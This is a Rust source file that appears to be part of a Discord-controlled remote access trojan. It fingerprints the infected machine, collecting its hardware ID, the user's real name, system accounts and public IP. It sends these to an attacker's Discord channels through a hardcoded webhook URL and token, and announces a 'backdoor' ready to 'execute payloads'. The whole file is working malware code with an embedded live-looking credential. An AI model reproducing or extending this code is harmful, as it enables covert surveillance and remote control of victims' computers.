use crate::formats::*;

use std::collections::HashMap;
use std::io::{self, Write};

use chrono::prelude::*;
use reqwest;
use serenity;
use serenity::builder::{CreateEmbed, CreateMessage};
use serenity::framework::standard::macros::hook;
use serenity::framework::standard::{Args, CommandResult};
use serenity::http::Http;
use serenity::model::channel;
use serenity::model::webhook::Webhook;
use serenity::prelude::*;
use serenity::model::prelude::Message;
use serenity::utils::Color;
use sysinfo::{System, SystemExt, User, UserExt};
use serde::Serialize;
use serde_json::{Value, json};
use machine_uid;
use whoami::{hostname, realname};
use jsonformat::{Indentation, format};

pub const BOT_PREFIX: &str = "$";
pub const RAT_SERVER: u64 = 1028955054490779701;

pub const LOG_WEBHOOK: &str = "https://discord.com/api/webhooks/1028991227925897240/ta_VM8totTAxI02pu4IvuHutj2Aw1YJlXP3R0B9L68ahDkUDw1K2ByvX9vqzrAAiaHj0";
pub const LOG_WEBHOOK_ID: &str = "1028991227925897240";
pub const LOG_WEBHOOK_TOKEN: &str = "ta_VM8totTAxI02pu4IvuHutj2Aw1YJlXP3R0B9L68ahDkUDw1K2ByvX9vqzrAAiaHj0";

pub const TARGETS_CHANNEL_ID: u64  = 1028955206404292670;
pub const METADATA_CHANNEL_ID: u64 = 1028955192479195206;
pub const PAYLOADS_CHANNEL_ID: u64 = 1028955177438425098;

pub const IGNORE_MSG_PREFIX: &str = "/>";
pub const CONFIG_MSG_PREFIX: &str = "[cfg]";

pub fn create_log_msg(msg: String) -> String {
    let t = Local::now();
    let mut nano = t.nanosecond().to_string();
    nano.truncate(2);

    format!(
        "**[** CET {:0>2}/{:0>2}/{:0>2} - {:0>2}:{:0>2}:{:0>2}.{:0>2} **] >>** {:0>2}",
        t.day(),
        t.month(),
        t.year(),
        t.hour(),
        t.minute(),
        t.second(),
        nano,
        msg
    )
}


pub async fn get_pub_ip() -> String {
    type Store = HashMap::<String, String>;
    let res = reqwest::get("https://api.ipify.org?format=json").await;

    let a = res.unwrap().json::<Store>().await.unwrap();
    
    if a.contains_key("ip") {
        a.get("ip").unwrap().to_owned()
    } else {
        String::from("undefined")
    }
}


pub fn get_system_users() -> Vec<String> {
    let system = System::new_all();
    system.users()
        .into_iter()
        .map(|i| i.name().to_string())
        .collect::<Vec<String>>()
}


pub fn clear_console() {
    print!("{esc}[2J{esc}[1;1H", esc = 27 as char);
    io::stdout().flush().expect("Couldn't CLS console");
}


pub async fn send_log_webhook(webhook_url: String, text: &str) -> Result<Option<Message>, SerenityError> {
    println!(" {} Sending webhook", Pr::event());
    let http = Http::new("");
    Webhook::from_url(&http, LOG_WEBHOOK).await
        .expect("Couldn't create webhook")
        .execute(&http, false, |f| f
        .content(create_log_msg(text.to_string()))
    ).await
}


pub struct RatConfig {
    pub targets_ch: u64,
    pub metadata_ch: u64,
    pub payloads_ch: u64,
}

impl RatConfig {    
    pub fn new(targets_channel: u64, metadata_channel: u64, payloads_channel: u64) -> Self{
        RatConfig {
            targets_ch: targets_channel,
            metadata_ch: metadata_channel,
            payloads_ch: payloads_channel,
        }
    }

    pub async fn config_targets_channel(&self, ctx: &Context) -> Result<(), SerenityError> {
        let channel = ctx.http.get_channel(self.targets_ch).await.expect("Couldn't get targets channel")
            .guild()
            .expect("Couldn't get channel");

        let messages = channel.messages(&ctx.http, |m| m
            .limit(10)
        ).await?;

        let mut cfg_msg = None;
        let mut cfg_msg_content: Option<String> = None;
        for message in messages {
            if message.content.starts_with(IGNORE_MSG_PREFIX) { continue; }
            if message.content.starts_with(CONFIG_MSG_PREFIX) {
                cfg_msg_content = Some(message.content.to_string());
                cfg_msg = Some(message);
                break;
            }
        }

        let hwid = machine_uid::get().expect("Couldn't get UUID");
        if let Some(msg) = cfg_msg_content {
            let targets = from_discord_json(msg);
            let mut targets_json: Value = serde_json::from_str(&targets.as_str()).unwrap();

            let mut found = false;
            for (key, value) in targets_json.as_object().unwrap() {
                if hwid == value.as_str().unwrap() {
                    found = true;
                }
            }
            // if new target, if current machine not found in [cfg] JSON in #targets
            if found == false {
                let mut json = targets_json.as_object_mut().unwrap();
                json.insert(realname(), Value::String(hwid));
                let new_targets_json: Value = json.to_owned().into();

                let string = format_json_msg(&new_targets_json);

                cfg_msg.unwrap().edit(&ctx.http, |m| m
                    .content(to_discord_json(string))
                ).await;
            }
        } else {
            let default_msg = json!({ realname(): hwid });
            let string = format_json_msg(&default_msg);

            channel.send_message(&ctx.http, |m| m
                .content(to_discord_json(string))
            ).await;
        }

        Ok(())
    }

    pub async fn send_target_embed(&self, ctx: &Context) -> Result<(), SerenityError> {
        let channel = ctx.cache.guild_channel(self.payloads_ch).unwrap();
        let t_embed = target_embed().await;
        channel.send_message(&ctx.http, |m| m
            .set_embed(t_embed)
        ).await?;     
        Ok(())
    }
}


fn to_discord_json(mut string: String) -> String {
    // let mut json = string.to_string();
    // json = json.replace("{\"", "[cfg]\n```json\n{\n\t\"");
    // json = json.replace("\":\"", "\": \"");
    // json = json.strip_suffix("\"}").unwrap().to_string();
    // json.push_str("\"\n}```");
    // json
    // format(json.as_str(), Indentation::Tab)
    string.push_str("```");
    string.insert_str(0, "[cfg]\n```json\n");
    string
}

fn from_discord_json(mut string: String) -> String {
    string = string.trim_end_matches("```").to_string();
    string.trim_start_matches("[cfg]\n```json\n").to_string()
}


fn format_json_msg(json: &Value) -> String {
    let buf = Vec::new();
    let formatter = serde_json::ser::PrettyFormatter::with_indent(b"\t");
    let mut ser = serde_json::Serializer::with_formatter(buf, formatter);
    json.serialize(&mut ser).unwrap();
    String::from_utf8(ser.into_inner()).unwrap()
}


async fn ip(ctx: &Context, msg: &Message) -> CommandResult {
    let ip = get_pub_ip().await;
    let embed = msg.channel_id
        .send_message(&ctx.http, |m|
            m.embed(|e| e
                .color(Color::DARK_GREEN)
                .description(format!("IP: {}", ip))
                // .description(format!("🏓 Bots Latency: {:?}", runner.latency))
            )
        ).await;
    
    match embed {
        Ok(_) => { println!(" {} sent Ping response!", Pr::event()); },
        Err(e) => { println!(" {} Couldn't send message: {}", Pr::err(), e); }
    }

    Ok(())
}

// TODO
async fn info(ctx: &Context, msg: &Message, test: Args) -> CommandResult {
    let users = get_system_users();

    println!(" args : {:?}", test);

    msg.channel_id.send_message(&ctx.http, |f| f
        .content(format!(" - {}", users.join("\n- ")))
    ).await;

    Ok(())
}


pub async fn target_embed() -> CreateEmbed {
    let system = System::new_all();
    let boot_time = Local::now();

    CreateEmbed::default()
        .color(Color::RED)
        .title("Current targeted machine is now available!")
        .description("You can now use commands and execute payloads")
        .author(|a| a
            .name(whoami::hostname())
            .icon_url("https://i.pcmag.com/imagery/articles/061CyMCZV6G2sXUmreKHvXS-1..v1581020108.jpg")
            .url("https://img.nieuwsblad.be/290BzC-HhLF-NteAGwtLTu3EU38=/960x640/smart/https%3A%2F%2Fstatic.nieuwsblad.be%2FAssets%2FImages_Upload%2F2022%2F03%2F17%2F1fdb8bd9-da61-4e63-a980-b204ee4ae678.jpg")
        )
        .thumbnail("https://img.nieuwsblad.be/290BzC-HhLF-NteAGwtLTu3EU38=/960x640/smart/https%3A%2F%2Fstatic.nieuwsblad.be%2FAssets%2FImages_Upload%2F2022%2F03%2F17%2F1fdb8bd9-da61-4e63-a980-b204ee4ae678.jpg")
        .field("Public-Ip", get_pub_ip().await, true)
        .field("Logged-In User", whoami::realname(), true)
        .field("Backdoor Startup", format!(
            "{:0>2}/{:0>2}/{:0>2} - {:0>2}:{:0>2}:{:0>2} CET",
            boot_time.day(),
            boot_time.month(),
            boot_time.year(),
            boot_time.hour(),
            boot_time.minute(),
            boot_time.second(),
        ),
        true
        )
        .footer(|f| f
            .text("!help for list of commands")
        ).to_owned()
}

